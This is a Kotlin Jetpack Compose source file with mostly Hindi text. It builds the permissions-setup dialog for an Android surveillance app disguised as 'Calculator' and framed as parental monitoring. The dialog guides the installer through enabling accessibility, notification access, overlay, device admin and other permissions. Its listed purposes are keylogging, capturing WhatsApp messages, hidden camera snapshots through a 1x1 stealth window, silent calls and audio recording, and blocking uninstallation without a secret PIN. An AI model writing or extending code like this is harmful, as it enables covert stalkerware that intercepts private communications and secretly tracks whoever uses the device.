package com.example.authapp.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp

internal data class PermissionGuideItem(
    val id: String,
    val title: String,
    val isGranted: Boolean,
    val manualPath: String,
    val purpose: String,
    val onToggle: () -> Unit
)

@Composable
fun ChildPermissionsSettingsDialog(
    hasNotificationListener: Boolean,
    hasAccessibility: Boolean,
    hasOverlay: Boolean,
    hasUsageAccess: Boolean,
    isBatteryOptimizationIgnored: Boolean,
    isDeviceAdminActive: Boolean,
    hasExactAlarm: Boolean,
    hasCorePermissions: Boolean,
    onRequestCorePermissions: () -> Unit,
    onOpenNotificationListener: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenOverlay: () -> Unit,
    onOpenUsageAccess: () -> Unit,
    onOpenBatteryOptimization: () -> Unit,
    onOpenDeviceAdmin: () -> Unit,
    onOpenExactAlarm: () -> Unit,
    onDismiss: () -> Unit
) {
    val items = listOf(
        PermissionGuideItem(
            id = "accessibility",
            title = "1. Accessibility Service (पहुंच-योग्यता)",
            isGranted = hasAccessibility,
            manualPath = "फोन सेटिंग्स ➔ Accessibility ➔ Installed Apps ➔ Calculator को चालू (ON) करें।",
            purpose = "Keylogger (टाइपिंग कैप्चर), YouTube वीडियो ट्रैकिंग और स्क्रीन शेयर ऑटो-स्टार्ट के लिए अनिवार्य।",
            onToggle = onOpenAccessibility
        ),
        PermissionGuideItem(
            id = "notification",
            title = "2. Notification Access (नोटिफिकेशन पहुंच)",
            isGranted = hasNotificationListener,
            manualPath = "फोन सेटिंग्स ➔ Apps ➔ Special App Access ➔ Device & App Notifications ➔ Calculator को Allow करें।",
            purpose = "WhatsApp संदेश, इनकमिंग चैट्स और सिस्टम नोटिफिकेशन्स बैकग्राउंड में पकड़ने के लिए।",
            onToggle = onOpenNotificationListener
        ),
        PermissionGuideItem(
            id = "overlay",
            title = "3. Appear on Top (स्क्रीन ओवरले)",
            isGranted = hasOverlay,
            manualPath = "फोन सेटिंग्स ➔ Apps ➔ Special App Access ➔ Appear on top (ऊपर दिखाएं) ➔ Calculator को ON करें।",
            purpose = "बैकग्राउंड कैमरा स्नैपशॉट और 1x1 स्टेल्थ विंडो चलाने के लिए।",
            onToggle = onOpenOverlay
        ),
        PermissionGuideItem(
            id = "usage",
            title = "4. Usage Data Access (ऐप उपयोग समय)",
            isGranted = hasUsageAccess,
            manualPath = "फोन सेटिंग्स ➔ Apps ➔ Special App Access ➔ Usage Data Access ➔ Calculator को ON करें।",
            purpose = "बच्चे ने कौन सा ऐप कितने घंटे चलाया, स्क्रीन-टाइम देखने के लिए।",
            onToggle = onOpenUsageAccess
        ),
        PermissionGuideItem(
            id = "battery",
            title = "5. Unrestricted Battery (अप्रतिबंधित बैटरी)",
            isGranted = isBatteryOptimizationIgnored,
            manualPath = "फोन सेटिंग्स ➔ Apps ➔ Calculator ➔ Battery ➔ Unrestricted (अप्रतिबंधित) चुनें।",
            purpose = "फोन लॉक होने पर ऐप को बैकग्राउंड में बंद होने से बचाने के लिए (24x7 ट्रैकिंग)।",
            onToggle = onOpenBatteryOptimization
        ),
        PermissionGuideItem(
            id = "admin",
            title = "6. Device Admin Protection (अनइंस्टॉल सुरक्षा)",
            isGranted = isDeviceAdminActive,
            manualPath = "फोन सेटिंग्स ➔ Security ➔ Device Admin Apps ➔ Calculator को Activate करें।",
            purpose = "बिना पैरेंट के 6-अंकीय सीक्रेट पिन के ऐप को फोन से डिलीट होने से रोकने के लिए।",
            onToggle = onOpenDeviceAdmin
        ),
        PermissionGuideItem(
            id = "exact_alarm",
            title = "7. Exact Alarms (शेड्यूल अलार्म)",
            isGranted = hasExactAlarm,
            manualPath = "फोन सेटिंग्स ➔ Apps ➔ Special App Access ➔ Alarms & Reminders ➔ Calculator ON",
            purpose = "पैरेंट द्वारा तय किए गए समय पर ऑटोमैटिक साइलेंट कॉल व ऑडियो रिकॉर्डिंग शुरू करने के लिए।",
            onToggle = onOpenExactAlarm
        )
    )

    AlertDialog(
        onDismissRequest = onDismiss,
        modifier = Modifier
            .fillMaxWidth()
            .fillMaxHeight(0.92f),
        title = {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.Settings,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary,
                        modifier = Modifier.size(24.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "सिस्टम सेटिंग्स व अनुमतियां",
                        style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold)
                    )
                }
                IconButton(onClick = onDismiss) {
                    Icon(Icons.Default.Close, contentDescription = "Close")
                }
            }
        },
        text = {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .verticalScroll(rememberScrollState())
            ) {
                Text(
                    text = "ऐप के सभी फीचर्स (Keylogger, WhatsApp, Snapshots) सक्रिय करने के लिए नीचे दिए गए टॉगल को चालू करें। आप मैन्युअल सेटिंग्स पाथ देखकर फोन सेटिंग्स से भी चालू कर सकते हैं:",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(14.dp))

                // Core Permissions Banner
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = if (hasCorePermissions) Color(0xFFE8F5E9) else Color(0xFFFFF3E0)
                    )
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = if (hasCorePermissions) Icons.Default.CheckCircle else Icons.Default.Security,
                                contentDescription = null,
                                tint = if (hasCorePermissions) Color(0xFF2E7D32) else Color(0xFFE65100),
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "मुख्य अनुमतियाँ (कैमरा, माइक, GPS, कॉल, SMS)",
                                style = MaterialTheme.typography.labelLarge.copy(fontWeight = FontWeight.Bold),
                                color = if (hasCorePermissions) Color(0xFF2E7D32) else Color(0xFFE65100)
                            )
                        }
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(
                            text = if (hasCorePermissions) "✅ सभी मुख्य अनुमतियाँ चालू हैं।" else "⚠️ लाइव वीडियो, ऑडियो व कॉल के लिए मुख्य परमिशन चालू करें।",
                            style = MaterialTheme.typography.bodySmall
                        )
                        if (!hasCorePermissions) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Button(
                                onClick = onRequestCorePermissions,
                                shape = RoundedCornerShape(8.dp),
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text("मुख्य परमिशन पॉप-अप खोलें (Allow All)")
                            }
                        }
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                // Special Settings List
                items.forEach { item ->
                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 6.dp),
                        shape = RoundedCornerShape(14.dp),
                        colors = CardDefaults.cardColors(
                            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                        ),
                        border = androidx.compose.foundation.BorderStroke(
                            1.dp,
                            if (item.isGranted) Color(0xFF2E7D32).copy(alpha = 0.4f)
                            else MaterialTheme.colorScheme.error.copy(alpha = 0.35f)
                        )
                    ) {
                        Column(modifier = Modifier.padding(14.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Column(modifier = Modifier.weight(1f)) {
                                    Text(
                                        text = item.title,
                                        style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Bold),
                                        color = MaterialTheme.colorScheme.onSurface
                                    )
                                    Spacer(modifier = Modifier.height(2.dp))
                                    Surface(
                                        shape = RoundedCornerShape(6.dp),
                                        color = if (item.isGranted) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
                                    ) {
                                        Text(
                                            text = if (item.isGranted) "चालू (ACTIVE)" else "बंद (OFF)",
                                            style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
                                            color = if (item.isGranted) Color(0xFF2E7D32) else Color(0xFFC62828),
                                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                        )
                                    }
                                }
                                Switch(
                                    checked = item.isGranted,
                                    onCheckedChange = { item.onToggle() }
                                )
                            }

                            Spacer(modifier = Modifier.height(8.dp))

                            // Manual Settings Path box
                            Surface(
                                shape = RoundedCornerShape(8.dp),
                                color = MaterialTheme.colorScheme.surface,
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Column(modifier = Modifier.padding(8.dp)) {
                                    Text(
                                        text = "📂 सेटिंग्स पाथ (कहाँ मिलेगा):",
                                        style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
                                        color = MaterialTheme.colorScheme.primary
                                    )
                                    Text(
                                        text = item.manualPath,
                                        style = MaterialTheme.typography.bodySmall,
                                        color = MaterialTheme.colorScheme.onSurface
                                    )
                                }
                            }

                            Spacer(modifier = Modifier.height(6.dp))

                            Text(
                                text = item.purpose,
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )

                            Spacer(modifier = Modifier.height(8.dp))

                            Button(
                                onClick = item.onToggle,
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (item.isGranted) MaterialTheme.colorScheme.secondaryContainer else MaterialTheme.colorScheme.primary
                                ),
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(
                                    text = if (item.isGranted) "सेटिंग्स खोलें (Open Settings)" else "अभी चालू करें (Turn ON)",
                                    color = if (item.isGranted) MaterialTheme.colorScheme.onSecondaryContainer else MaterialTheme.colorScheme.onPrimary
                                )
                            }
                        }
                    }
                }
            }
        },
        confirmButton = {
            Button(
                onClick = onDismiss,
                shape = RoundedCornerShape(10.dp)
            ) {
                Text("पूर्ण (Done)")
            }
        }
    )
}
